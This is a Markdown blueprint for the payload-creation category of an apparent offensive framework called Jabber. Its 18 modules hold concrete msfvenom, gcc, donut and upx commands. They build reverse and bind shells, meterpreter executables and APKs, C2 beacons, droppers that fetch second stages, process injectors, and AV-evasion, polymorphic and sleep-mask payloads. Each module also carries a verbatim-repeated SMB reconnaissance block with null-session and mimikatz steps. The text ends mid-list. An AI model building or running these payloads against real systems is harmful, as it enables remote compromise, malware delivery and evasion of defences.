# Payload Creation & Injection — Category Blueprint

**Category:** `PAYLOAD_CREATION` | **Slug:** `payload` | **Tools Dir:** `~/jabber/jabber-tools/payload/`
**Package:** `com.jabber.jabber.modules.payload` | **Group:** Operations & Assets

---

## ToolManager: `payload/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `msfvenom` | `msfvenom` | apt (metasploit-framework) | `msfvenom --version` | `apt_install` |
| `msfconsole` | `msfconsole` | apt (metasploit-framework) | `msfconsole -v` | `apt_install` |
| `gcc` | `gcc` | apt (build-essential) | `gcc --version` | `apt_install` |
| `nasm` | `nasm` | apt | `nasm --version` | `apt_install` |
| `objdump` | `objdump` | apt (binutils) | `objdump --version` | `apt_install` |
| `upx` | `upx` | apt/github | `upx --version` | `apt_install` |
| `donut` | `donut` | `TheWover/donut` | `donut --help` | `github_release` |
| `apktool` | `apktool` | apt/github | `apktool --version` | `apt_install` |
| `jarsigner` | `jarsigner` | apt (openjdk) | `jarsigner -help` | system |
| `pyinstaller` | `pyinstaller` | pip | `pyinstaller --version` | `pip_install` |
| `openssl` | `openssl` | system | `openssl version` | system |

---

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Payload Creation** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between operations.
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading results and logs.
4. **Live Terminal Stream**: A real-time stdout/stderr streaming component for operational transparency.
5. **Interactive Dashboard**: Real-time display of extracted data, payloads, or process progress.

---

---

## Modules

### 1. Reverse Shell Generator
**ID:** `payload-revshell` | **Risk:** HIGH | **File:** `RevShellGenModule.java`
**Tools:** `msfvenom`, `netcat`, `nasm`, `gcc`, `openssl`

#### Execution Modes:

- **`VNOM`** (Short Name: `VNOM`)
    - **Purpose**: Automated generation of cross-platform reverse shell payloads via MSFVenom.
    - **Input Schema**: `{ os: String, arch: String, lhost: String, lport: int, format: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <os>/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <format>` (Core Generation)
        2. `openssl req -new -x509 -nodes -out cert.pem -keyout key.pem -days 365` (SSL Cert Gen)
        3. `msfvenom -p <os>/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f c` (Shellcode Disclosure)
    - **Execution Flow**: Core Gen -> SSL Gen -> Shellcode Disclosure -> Wrapper -> Listener Prep.

- **`CSTM`** (Short Name: `CSTM`)
    - **Purpose**: Compilation and hardening of hand-crafted C-based reverse shells.
    - **Input Schema**: `{ os: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o revshell revshell.c -DLHOST=\"<lhost>\" -DLPORT=<lport>` (Core Compilation)
        2. `nasm -f elf64 stub.asm -o stub.o` (Assembly Stub Gen)
        3. `msfvenom --help` (Binary Check)
    - **Execution Flow**: Core Compilation -> Assembly Stub -> Binary Check.

---

### 2. Bind Shell Generator
**ID:** `payload-bindshell` | **Risk:** HIGH | **File:** `BindShellGenModule.java`
**Tools:** `msfvenom`, `nasm`, `gcc`, `netcat`, `objdump`

#### Execution Modes:

- **`VNOM`** (Short Name: `VNOM`)
    - **Purpose**: Generation of bind shell payloads for remote service establishment.
    - **Input Schema**: `{ os: String, arch: String, lport: int, format: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <os>/shell/bind_tcp LPORT=<lport> -f <format>` (Core Gen)
        2. `objdump -d payload.bin` (Binary Audit)
        3. `gcc -o bind_stub stub.c` (Wrapper Gen)
    - **Execution Flow**: Core Gen -> Binary Audit -> Wrapper.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 3. Shellcode Generator
**ID:** `payload-shellcode` | **Risk:** CRITICAL | **File:** `ShellcodeGeneratorModule.java`
**Tools:** `msfvenom`, `nasm`, `ld`, `objdump`, `gcc`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generation of raw, position-independent shellcode for exploit integration.
    - **Input Schema**: `{ payload: String, badchars: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <payload> -f raw -b "<badchars>"` (Core Shellcode Gen)
        2. `objdump -D -b binary -m i386 payload.raw` (Validation Disassembly)
        3. `gcc -o test_shell shellcode_tester.c` (Functionality Test)
    - **Execution Flow**: Core Gen -> Validation -> Functionality Test.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 4. C2 Beacon Generator
**ID:** `payload-c2beacon` | **Risk:** CRITICAL | **File:** `C2BeaconGeneratorModule.java`
**Tools:** `msfvenom`, `donut`, `upx`, `gcc`, `openssl`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Creation of advanced C2 beacons with embedded encryption and TLS support.
    - **Input Schema**: `{ payload: String, lhost: String, cert: Path }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <payload> LHOST=<lhost> -f exe` (Core Beacon Gen)
        2. `donut -i beacon.exe -o beacon.bin` (Shellcode Conversion)
        3. `upx --best beacon.exe` (Compression)
    - **Execution Flow**: Core Gen -> Conversion -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 5. Dropper Generator
**ID:** `payload-dropper` | **Risk:** HIGH | **File:** `DropperGenModule.java`
**Tools:** `msfvenom`, `gcc`, `upx`, `pyinstaller`, `openssl`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Create a low-entropy dropper that fetches and executes a second-stage payload.
    - **Input Schema**: `{ url: String, output: String }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o <output> dropper.c -DURL=\"<url>\"` (Core Compilation)
        2. `upx --best <output>` (Core Compression)
        3. `pyinstaller --onefile dropper.py` (Alternative Python Gen)
    - **Execution Flow**: Core Compilation -> Compression -> Alternative Gen.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 6. Payload Obfuscator
**ID:** `payload-obfuscator` | **Risk:** HIGH | **File:** `ObfuscatorGenModule.java`
**Tools:** `msfvenom`, `upx`, `donut`, `pyinstaller`, `gcc`

#### Execution Modes:

- **`DONT`** (Short Name: `DONT`)
    - **Purpose**: Transform standard PE/DLL files into position-independent shellcode using Donut.
    - **Input Schema**: `{ input: Path, output: String }`
    - **Multi-Tool Command Logic**:
        1. `donut -i <input> -o <output>` (Core Conversion)
        2. `msfvenom -p - -e x86/shikata_ga_nai -f raw < <output>` (Encoding Layer)
        3. `upx --best <output>` (Compression Layer)
    - **Execution Flow**: Core Conversion -> Encoding -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 7. Polymorphic Generator
**ID:** `payload-polymorph` | **Risk:** HIGH | **File:** `PolymorphGenModule.java`
**Tools:** `msfvenom`, `nasm`, `gcc`, `objdump`, `upx`

#### Execution Modes:

- **`MUTATE`** (Short Name: `MUTATE`)
    - **Purpose**: Generate polymorphic shellcode variants to evade signature-based detection.
    - **Input Schema**: `{ shellcode_file: Path }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p - -e x86/shikata_ga_nai -i 10 -f raw < <shellcode_file>` (Core Mutation)
        2. `objdump -D -b binary -m i386 mutated.bin` (Validation)
        3. `nasm -f bin stub.asm` (Custom Stub Logic)
    - **Execution Flow**: Core Mutation -> Validation -> Custom Stub.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 8. Sleep Mask Generator
**ID:** `payload-sleepmask` | **Risk:** CRITICAL | **File:** `SleepMaskGenModule.java`
**Tools:** `msfvenom`, `gcc`, `nasm`, `donut`, `upx`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate payloads with advanced sleep masks to bypass in-memory scanners.
    - **Input Schema**: `{ payload: String, mask_type: String }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o masked_payload.exe sleepmask.c -DTYPE=<mask_type>` (Core Masking)
        2. `nasm -f win64 mask_stub.asm` (Assembly Logic)
        3. `donut -i masked_payload.exe -o masked.bin` (Conversion)
    - **Execution Flow**: Core Masking -> Assembly -> Conversion.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 9. Format Converter
**ID:** `payload-converter` | **Risk:** LOW | **File:** `FormatConverterModule.java`
**Tools:** `msfvenom`, `donut`, `upx`, `objdump`, `file`

#### Execution Modes:

- **`CNVT`** (Short Name: `CNVT`)
    - **Purpose**: Transform payload files between various operational formats (e.g., EXE to Shellcode).
    - **Input Schema**: `{ input: Path, format: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p - -f <format> < <input>` (Core Conversion)
        2. `donut -i <input> -o output.bin` (Shellcode Alternative)
        3. `objdump -d <input>` (Structure Audit)
    - **Execution Flow**: Core Conversion -> Shellcode Alternative -> Structure Audit.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 10. Payload Command Gen
**ID:** `payload-command` | **Risk:** HIGH | **File:** `PayloadCommandModule.java`
**Tools:** `msfvenom`, `msfconsole`, `gcc`, `nasm`, `netcat`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate high-fidelity one-liner commands for instant shell execution.
    - **Input Schema**: `{ type: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p cmd/unix/reverse_bash LHOST=<lhost> LPORT=<lport> -f raw` (Core Bash Gen)
        2. `msfvenom -p cmd/windows/reverse_powershell LHOST=<lhost> LPORT=<lport> -f raw` (Core PS Gen)
    - **Execution Flow**: Bash Gen -> PS Gen.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 11. Payload Encryptor
**ID:** `payload-encrypt` | **Risk:** MEDIUM | **File:** `PayloadEncryptionModule.java`
**Tools:** `openssl`, `msfvenom`, `gcc`, `nasm`, `python3`

#### Execution Modes:

- **`ENCR`** (Short Name: `ENCR`)
    - **Purpose**: Encrypt payload binaries or shellcode using industry-standard algorithms.
    - **Input Schema**: `{ input: Path, key: String, algo: String }`
    - **Multi-Tool Command Logic**:
        1. `openssl enc -<algo> -salt -in <input> -out <input>.enc -pass pass:<key>` (Core Encryption)
        2. `python3 encrypt_blob.py --in <input> --key <key>` (Alternative Script)
    - **Execution Flow**: Core Encryption -> Alternative Script.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 12. Payload Evasion
**ID:** `payload-evasion` | **Risk:** HIGH | **File:** `PayloadEvasionModule.java`
**Tools:** `msfvenom`, `donut`, `upx`, `gcc`, `pyinstaller`

#### Execution Modes:

- **`AVBP`** (Short Name: `AVBP`)
    - **Purpose**: Inject advanced AV evasion stubs (sandbox detection, unhooking) into payloads.
    - **Input Schema**: `{ payload: Path, technique: String }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o evaded.exe evasion_stub.c -DTECHNIQUE=<technique> -DBIN=\"<payload>\"` (Core Evasion)
        2. `donut -i evaded.exe -o evaded.bin` (Shellcode Conversion)
    - **Execution Flow**: Core Evasion -> Conversion.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 13. Payload Injection
**ID:** `payload-inject` | **Risk:** CRITICAL | **File:** `PayloadInjectionModule.java`
**Tools:** `msfvenom`, `donut`, `gcc`, `nasm`, `objdump`

#### Execution Modes:

- **`INJT`** (Short Name: `INJT`)
    - **Purpose**: Create a payload that performs process injection (Process Hollowing, APC).
    - **Input Schema**: `{ target_process: String, shellcode: Path }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o injector.exe inject.c -DPROCESS=\"<target_process>\" -DSHELLCODE=\"<shellcode>\"` (Core Injector)
        2. `donut -i injector.exe -o injector.bin` (Shellcode Conversion)
    - **Execution Flow**: Core Injector -> Conversion.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 14. Windows Payload Gen
**ID:** `payload-windows` | **Risk:** HIGH | **File:** `WindowsPayloadModule.java`
**Tools:** `msfvenom`, `donut`, `upx`, `gcc`, `pyinstaller`

#### Execution Modes:

- **`EXE`** (Short Name: `EXE`)
    - **Purpose**: Generate a Windows Executable (PE) payload with integrated persistence.
    - **Input Schema**: `{ arch: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe` (Core EXE Gen)
        2. `upx --best output.exe` (Compression)
    - **Execution Flow**: Core EXE -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 15. Linux Payload Gen
**ID:** `payload-linux` | **Risk:** HIGH | **File:** `LinuxPayloadModule.java`
**Tools:** `msfvenom`, `gcc`, `nasm`, `upx`, `pyinstaller`

#### Execution Modes:

- **`ELF`** (Short Name: `ELF`)
    - **Purpose**: Generate a Linux Executable (ELF) payload with anti-debugging stubs.
    - **Input Schema**: `{ arch: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf` (Core ELF Gen)
        2. `upx --best output.elf` (Compression)
    - **Execution Flow**: Core ELF -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 16. Android Payload Gen
**ID:** `payload-android` | **Risk:** HIGH | **File:** `AndroidPayloadModule.java`
**Tools:** `msfvenom`, `apktool`, `jarsigner`, `keytool`, `zipalign`

#### Execution Modes:

- **`APK`** (Short Name: `APK`)
    - **Purpose**: Generate a standalone Android APK payload with signed certificate.
    - **Input Schema**: `{ lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p android/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -o payload.apk` (Core APK Gen)
        2. `keytool -genkey -v -keystore my-release-key.keystore` (Cert Gen)
    - **Execution Flow**: Core APK -> Cert Gen.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 17. Application Payload Gen
**ID:** `payload-app` | **Risk:** MEDIUM | **File:** `ApplicationPayloadModule.java`
**Tools:** `msfvenom`, `gcc`, `pyinstaller`, `upx`, `openssl`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate application-specific payloads (War, Ear, Jar).
    - **Input Schema**: `{ format: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p java/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f <format>` (Core App Gen)
        2. `gcc -o loader loader.c` (C-Loader)
        3. `upx --best loader` (Compression)
    - **Execution Flow**: Core App Gen -> C-Loader -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 18. Payload Integration
**ID:** `payload-integration` | **Risk:** MEDIUM | **File:** `PayloadIntegrationModule.java`
**Tools:** `msfvenom`, `donut`, `gcc`, `nasm`, `objdump`

#### Execution Modes:

- **`MRGE`** (Short Name: `MRGE`)
    - **Purpose**: Integrate multiple payloads into a single multi-stage delivery system.
    - **Input Schema**: `{ primary: Path, secondary: Path }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o merged.exe integration.c -DP1=\"<primary>\" -DP2=\"<secondary>\"` (Core Integration)
        2. `donut -i merged.exe -o merged.bin` (Conversion)
        3. `objdump -d merged.exe` (Validation)
    - **Execution Flow**: Core Integration -> Conversion -> Validation.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
